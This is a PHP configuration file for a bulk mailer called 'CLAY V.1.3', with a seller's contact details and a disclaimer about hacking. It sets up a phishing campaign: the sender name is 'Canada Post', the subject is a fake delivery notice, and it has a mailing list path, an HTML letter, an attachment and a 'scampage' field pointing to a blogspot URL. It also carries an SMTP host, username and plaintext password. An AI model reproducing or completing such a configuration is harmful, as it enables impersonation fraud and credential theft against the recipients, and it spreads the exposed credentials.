<?php

/*
   ╔╦╗╦╔═╗╔═╗  ╔═╗╔═╗╔╦╗╦ ╦╔═╗  
    ║ ║╠═╝╚═╗  ╚═╗║╣  ║ ║ ║╠═╝  
    ╩ ╩╩  ╚═╝  ╚═╝╚═╝ ╩ ╚═╝╩  
──────────────────────────────── 
* Use of other tools already provided by owner CLAY. If you have some problem.

* You can contact the manufacturer of the CLAY support if you need help or find some error in sender CLAY V.1.3.

* If You Want to Contact The CLAY Provider You Can Via Contact Below
  FB       : https://www.facebook.com/vidz.sianipar (Vidz)
  Whatsapp : +6282370721424
//Regards

* Use wisely. We are not responsible for the GX40 hacking. Because we provide the CLAY As Sender Email basically.

date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
[
        "host"     => "mail.postbank.pro",
        "port"     => "25",
        "username" => "admin",
        "password" => "fHzuGBoq1Dn0bLlFbUDGr1LL",
        "frommail" => "admin@postbank.pro",
    ],
];
/* Features SETUP */

$gx_setup = [
    "priority"       => 0,
    "userandom"      => 0,
    "sleeptime"      => 3,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/clay3.txt",
    "fromname"       => "Canada Post",
    "subject"        => "Delivery status notification ID #",
    "msgfile"        => "file/letter/ca.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["https://7113136763-av.blogspot.com/"],
];
